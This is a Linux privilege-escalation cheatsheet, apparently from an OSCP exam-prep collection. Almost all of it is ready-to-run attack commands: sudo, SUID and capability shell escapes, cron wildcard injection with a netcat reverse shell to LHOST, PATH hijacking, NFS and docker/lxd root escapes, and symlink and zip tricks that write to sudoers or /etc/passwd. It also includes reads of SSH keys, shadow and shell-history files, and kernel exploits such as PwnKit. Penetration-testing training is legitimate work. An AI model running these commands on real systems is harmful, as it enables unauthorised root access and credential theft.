# 03 · Linux Privilege Escalation

> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)

---

## LINUX PRIVILEGE ESCALATION

### Enumerate
```bash
# Automated
./linpeas.sh | tee linpeas.txt        # serve via http, curl|bash
# pspy to watch cron/processes WITHOUT root (catch cron jobs - Slonik pattern)
./pspy64
# Manual quick hits
id; sudo -l; uname -a; cat /etc/os-release
ls -la /home/*; cat /home/*/.bash_history; cat /home/*/.ssh/id_rsa
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
getcap -r / 2>/dev/null                        # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ss -tlnp; netstat -tlnp                        # internal services -> pivot/forward
env; cat /etc/passwd; ls -la /opt /srv /var/www
mount; cat /etc/fstab                          # nfs no_root_squash
```

### sudo -l  (top priority — check first)
```bash
# Anything listed -> GTFOBins it. Common wins:
sudo vim -c ':!/bin/sh'                  sudo less /etc/profile  -> !/bin/sh
sudo find . -exec /bin/sh \; -quit       sudo awk 'BEGIN{system("/bin/sh")}'
sudo python3 -c 'import os;os.system("/bin/sh")'      sudo perl -e 'exec "/bin/sh";'
sudo nmap --interactive -> !sh (old)     sudo env /bin/sh
# sudo with NOPASSWD on a custom script -> read it, hijack what it calls
# LD_PRELOAD / LD_LIBRARY_PATH if env_keep+= set:
sudo LD_PRELOAD=/tmp/x.so someprog       # compile x.so with _init() spawning shell
# (NOPASSWD) ALL or specific binary -> https://gtfobins.github.io
```

### SUID / SGID
```bash
# Each non-standard SUID -> GTFOBins (search the binary name)
# Examples:
./find . -exec /bin/sh -p \; -quit       # SUID find
cp /bin/bash /tmp/b; ... ; bash -p        # SUID bash copies / SUID cp /etc/passwd
# Custom SUID binary calling a command without abs path -> PATH hijack:
export PATH=/tmp:$PATH ; echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service
# strings the binary, ltrace it, find system()/exec calls
```
**SUID bash directly** (Trick / Slonik / fail2ban patterns): `bash -p` gives euid root shell.

### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_dac_read_search -> read any file (shadow); cap_setuid on others -> GTFOBins
```

### Cron jobs (use pspy to catch them)
```bash
# Writable script run by root cron -> add reverse shell / chmod +s /bin/bash
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/writable_cron_script
# Wildcard injection (tar/rsync in cron with *):
echo 'mkfifo /tmp/p;nc LHOST 443 0</tmp/p|/bin/sh>/tmp/p 2>&1' > shell.sh
touch ./--checkpoint=1; touch ./'--checkpoint-action=exec=sh shell.sh'
# PATH-relative binary in root cron/script -> PATH hijack
```

### PATH hijacking (DevArea pattern)
Binary or script (SUID/cron/sudo) calls e.g. `service`/`ps`/`cat` without full path → put a malicious one earlier in `$PATH`. Watch shebang & `set -e`/`pipefail` quirks in target scripts.

### NFS no_root_squash (Slonik-adjacent)
```bash
# kali (as root) — mount the export, drop a SUID-root bash
mkdir /mnt/x; mount -o rw,vers=3 $IP:/export /mnt/x
cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash
# target
/export/rootbash -p        # -> root
```

### Writable /etc/passwd or /etc/shadow
```bash
openssl passwd -1 -salt x pass            # make hash
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su root2
# Or blank root's x field if you can edit and no shadow
```

### Arbitrary file write as root → symlink-follow primitives
A root-run helper (a `sudo NOPASSWD` custom binary, a root cron, a SUID tool) that **writes/copies to an attacker-influenced destination path without `O_NOFOLLOW`** = arbitrary write as root. Plant a symlink at the destination, point it where you want, trigger the write.
```bash
# Pattern: tool copies <src> -> <dst> as root and follows symlinks on <dst>.
# 1) make the payload (mode matters for sudoers: must be 0440)
echo 'youruser ALL=(ALL) NOPASSWD:ALL' > payload; chmod 440 payload
# 2) plant a symlink where the tool will WRITE, pointing at the target file
ln -s /etc/sudoers.d/pwn dst_link
# 3) run the root tool so it copies payload -> dst_link (= /etc/sudoers.d/pwn)
#    then:
sudo -i        # you're root
```
**Best write-anywhere-as-root targets** (in order of reliability):
- `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
- `/etc/passwd` → append a `uid=0` user with a known hash (see above).
- root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it (often disabled — don't burn time here first).

**Archive-extraction variant (zip-slip / symlink-in-archive).** A root process that *extracts* an attacker-supplied `.zip`/`.tar` and preserves or follows **symlink members** gives the same primitive. Note: many libraries sanitize `../` traversal (collapsing dot segments) yet still mishandle symlink entries — so when plain `../../` is filtered, try a **symlink member** instead:
```bash
# source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
# destination-side symlink at the extract path -> arbitrary WRITE as root (sudoers.d trick above)
```
> Reproduce the extractor's exact behavior locally first (which lib/version, does it create real symlinks or write them as regular files?). The write-side `/etc/sudoers.d/` path lands far more often than the SSH path.

### Service / systemd / D-Bus / docker / lxd
```bash
# docker group (Kobold pattern): 
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd group:
lxc init alpine c -c security.privileged=true; lxc config device add c d disk source=/ path=/mnt; lxc start c; lxc exec c sh
# writable .service / writable ExecStart binary run by root -> replace + restart
# newgrp docker (Kobold) if your secondary group includes docker
```

### Kernel exploits (last resort — can crash the box)
```bash
uname -a ; searchsploit linux kernel <version>
# Classics: DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit/polkit (CVE-2021-4034), 
#   Sudo Baron Samedit (CVE-2021-3156), GameOverlay (CVE-2023-2640/32629)
# PwnKit is a reliable go-to on many older boxes:
./PwnKit        # self-contained
```

### Other
- Readable backups / config files with creds (Slonik: pg backup analysis).
- `.bash_history`, `.mysql_history`, `.viminfo`, `/var/mail`, `/var/backups`.
- Password reuse across users/services — always try found creds with `su`/SSH.
- Internal-only service on 127.0.0.1 → forward it out and attack (see Pivoting).

### Restricted shell escape (rbash / lshell / limited menus — Dante lshell pattern)
```bash
# Break out to a real shell:
vi              # then  :set shell=/bin/bash   ->  :shell    (or  :!/bin/bash)
python3 -c 'import pty;pty.spawn("/bin/bash")'
awk 'BEGIN{system("/bin/bash")}'
find / -name nonexistent -exec /bin/bash \; -quit
# Get in already-unrestricted:
ssh user@host -t "/bin/bash --noprofile --norc"
ssh user@host -t "() { :; }; /bin/bash"
# rbash: call binaries by absolute path (/bin/ls), or set PATH/SHELL if export allowed.
# lshell: try command injection inside an allowed builtin, or  echo os.system('/bin/bash')
```

### Misc Linux PE notes
```bash
sudo -V | head -1        # sudo version -> Baron Samedit CVE-2021-3156 if < 1.9.5p2
screen -list ; tmux ls   # SUID screen/tmux -> hijack/attach root sessions (rare, old screen 4.5.0)
# writable library path used by a root service -> drop malicious .so
# group 'disk' -> debugfs read raw device (read /etc/shadow); group 'video'/'shadow' wins
```

---
